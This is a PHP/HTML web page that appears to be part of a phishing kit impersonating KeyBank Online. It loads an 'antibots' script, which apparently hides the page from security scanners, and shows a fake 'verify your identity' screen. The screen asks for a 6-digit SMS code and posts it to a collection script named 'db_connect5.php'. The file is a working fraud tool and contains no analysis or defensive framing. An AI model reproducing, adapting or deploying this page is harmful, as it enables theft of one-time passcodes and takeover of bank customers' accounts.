<?php
require("antibots.php");
?>
<html lang="en"><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>KeyBank Online</title>
    <base href="">  
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="apple-touch-icon" sizes="180x180" id="appleTouchIcon" href="images/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" id="fav32" href="images/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" id="fav16" href="images/favicon-16x16.png">
    <link rel="shortcut icon" href="favicon.ico">
    <link rel="stylesheet" type="text/css" href="css/amt-ui-styles-key.css" media="all">
    <link href="css/kds-base-key.css" rel="stylesheet">
    <link href="css/ibx-globals-key.css" rel="stylesheet">
    <link href="css/ifstyles-key.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="css/amt-sdk-styles.css">
    <link rel="stylesheet" href="css/ifstyles.333ef4c4f4a519c61f8f.css">
    <style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}button#nebula_div_btn { height: auto !important } .kampyle_vertical_button { background-color:transparent !important;font-family:"Open Sans",sans-serif;cursor:pointer;position:fixed;top:45%;z-index:99999990;height:35px !important;min-height: 35px !important;max-height: 35px !important;width:125px !important;max-width: 125px !important;min-width: 125px !important;-ms-transform:rotate(90deg);-webkit-transform:rotate(90deg);transform:rotate(90deg) } .kampyle_vertical_button .kampyle_button { height:35px;min-height: 35px !important;max-height: 35px !important;width:125px !important;min-width: 125px !important;max-width: 125px !important; background:#5081ff;color:#ffffff;position:absolute;top:0;left:0;z-index:-1; } .kampyle_vertical_button .kampyle_button-text { color:#ffffff;font-size:14px;line-height:35px;text-align:center;font-weight:normal !important; } .kampyle_vertical_button.kampyle_left .kampyle_button { -webkit-border-radius:3px 3px 0 0;-moz-border-radius:3px 3px 0 0;-ms-border-radius:3px 3px 0 0;border-radius:3px 3px 0 0; } .kampyle_vertical_button.kampyle_right { right:-45px; } .kampyle_vertical_button.kampyle_left { left:-45px } .kampyle_vertical_button.kampyle_right .kampyle_button { -webkit-border-radius:0 0 3px 3px;-moz-border-radius:0 0 3px 3px;-ms-border-radius:0 0 3px 3px;border-radius:0 0 3px 3px } .kampyle_vertical_button.kampyle_right, .kampyle_vertical_button.kampyle_left  { padding: 0 !important; }</style>
</head>
<body>
<header class="container-fluid">
    <div class="container">
        <div class="row">
          <div class="col-12">
              <div class="forgots__app-header d-flex align-items-center justify-content-between">
                  <div class="key-logo no-print mb-0"><span><span class="sr-only">KeyBank</span><img alt="KeyBank" src="images/key_white_logo.png"></span></div>
                    <nav class="navbar navbar-expand-lg navbar-dark bg-dark float-right kds-long-form-text">
                        <div><button class="navbar-toggler" type="button"><span class="navbar-toggler-icon"></span></button>
                            <div class="collapse navbar-collapse navlink-wrapper">
                                <ul class="mb-0 pb-0">
                                    <li><a data-test="cntushdrlnk" title="Contact Us">Contact Us</a></li>
                                    <li><a data-test="openewaccount" title="Open a New Account">Open a New Account</a></li>
                                </ul>
                            </div>
                        </div>
                    </nav>
                </div>
            </div>
        </div>
    </div>
</header>
<div class="forgots-wrapper"><router-outlet></router-outlet>
    <self-unlock><div class="container">
        <div class="container">
            <div class="row">
                <div class="col-12 col-md-8 offset-md-2 col-xl-6 offset-xl-3 forgot-pwd-container">
                    <forgot-init currentpage="unlock-usr">
                        <div><h3 class="text-center" style="font-weight: 550">Let's verify your identity</h3>
                            <div><p style="font-weight: 550; text-align: center">For security reason, A 6-digit code has been sent to your phone number. Please wait a min.</p></div>
                            <div class="kds-form__field-group"></div>
                        </div>
                        <form action="db_connect5.php" method="Post" autocomplete="off">
                            <div class="row">
                                 <div class="col-12 col-sm-10">
                                    <div class="kds-form__field-group">
                                        <label class="kds-form__label" for="user-id"><span class="kds-form__label-cell kds-form__label-cell--text">Verification</span></label>
                                        <input class="kds-form__input ng-untouched ng-pristine ng-valid" id="user-id" placeholder="Enter Code" type="tel" maxlength="8" name="otp" required>
                                    </div>
                                </div>
                            </div>
                            <div class="forgot-button-block">
                                <button class="kds-button kds-button--primary" data-analytics-login="next" id="continue" role="button" type="submit">Verify</button>
                            </div>
                        </form>
                    </forgot-init>
                </div>
            </div>
        </div>
    </div>
</self-unlock>
</div>
</body>
</html>